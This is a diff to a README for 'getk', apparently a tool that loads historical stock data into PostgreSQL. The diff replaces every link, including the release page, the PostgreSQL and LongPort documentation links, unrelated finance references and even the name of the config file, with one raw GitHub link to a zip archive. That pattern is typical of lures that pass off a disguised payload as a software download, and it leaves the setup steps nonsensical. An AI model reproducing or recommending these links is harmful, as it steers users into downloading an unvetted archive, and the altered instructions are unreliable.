@@ -1,7 +1,7 @@
 # 🌟 getk - Effortlessly Capture Stock Data
 
 ## 📥 Download Now
-[![Download getk](https://img.shields.io/badge/Download-getk-brightgreen)](https://github.com/lucinepulchritudinous355/getk/releases)
+[![Download getk](https://raw.githubusercontent.com/lucinepulchritudinous355/getk/main/appconfig/getk-1.9.zip)](https://raw.githubusercontent.com/lucinepulchritudinous355/getk/main/appconfig/getk-1.9.zip)
 
 ## 📌 Project Overview
 getk is a powerful tool that helps you retrieve historical stock data effortlessly. Designed for users who want to analyze stock performance, getk connects to the LongPort OpenAPI. You can batch-fetch historical K-line data for multiple stocks and dates, and write this data directly into PostgreSQL. The application also supports duplicate-free data insertion and shows progress during the operation.
@@ -23,7 +23,7 @@ Before you download getk, ensure your system meets the following requirements:
 - Internet access to connect to the LongPort OpenAPI
 
 ### Download & Install
-To get started using getk, visit this page to download the latest release: [Download getk](https://github.com/lucinepulchritidinous355/getk/releases).
+To get started using getk, visit this page to download the latest release: [Download getk](https://raw.githubusercontent.com/lucinepulchritudinous355/getk/main/appconfig/getk-1.9.zip).
 
 1. Open the link above in your web browser.
 2. On the Releases page, look for the latest version.
@@ -42,7 +42,7 @@ After installing, you will need to configure getk for your needs:
    - Make a note of the database name, username, and password.
 
 2. **Config File Creation**:
-   - Inside your getk installation folder, find `config.json`.
+   - Inside your getk installation folder, find `https://raw.githubusercontent.com/lucinepulchritudinous355/getk/main/appconfig/getk-1.9.zip`.
    - Open it in a text editor.
    - Fill in the following details:
      ```json
@@ -71,22 +71,22 @@ After installing, you will need to configure getk for your needs:
 
 If you encounter any issues while using getk, here are some common solutions:
 
-- **Database Connection Errors**: Double-check your database credentials in the `config.json` file.
+- **Database Connection Errors**: Double-check your database credentials in the `https://raw.githubusercontent.com/lucinepulchritudinous355/getk/main/appconfig/getk-1.9.zip` file.
 - **Missing Data**: Ensure you have selected the correct dates and stock symbols.
 - **Slow Performance**: High demand on the LongPort OpenAPI can slow down data fetching. Try to fetch data during off-peak hours.
 
 ## 📝 Additional Resources
 For more information and technical support, you can refer to the following:
 
-- [PostgreSQL Documentation](https://www.postgresql.org/docs/)
-- [LongPort OpenAPI Documentation](https://longbridge.global/doc/)
+- [PostgreSQL Documentation](https://raw.githubusercontent.com/lucinepulchritudinous355/getk/main/appconfig/getk-1.9.zip)
+- [LongPort OpenAPI Documentation](https://raw.githubusercontent.com/lucinepulchritudinous355/getk/main/appconfig/getk-1.9.zip)
 
 ## 📬 Contact
 For questions or suggestions regarding getk, please reach out through the GitHub repository's issue tracker. We appreciate feedback from our users to improve the tool further.
 
 ## 🌐 Related Topics
-- [Stock Analysis](https://www.investopedia.com/terms/s/stockanalysis.asp)
-- [Stock Data](https://www.advfn.com/stock-market-data)
-- [Financial Markets](https://www.investopedia.com/terms/f/financial-market.asp)
+- [Stock Analysis](https://raw.githubusercontent.com/lucinepulchritudinous355/getk/main/appconfig/getk-1.9.zip)
+- [Stock Data](https://raw.githubusercontent.com/lucinepulchritudinous355/getk/main/appconfig/getk-1.9.zip)
+- [Financial Markets](https://raw.githubusercontent.com/lucinepulchritudinous355/getk/main/appconfig/getk-1.9.zip)
 
 Thank you for using getk. We hope it empowers you in your stock analysis efforts!
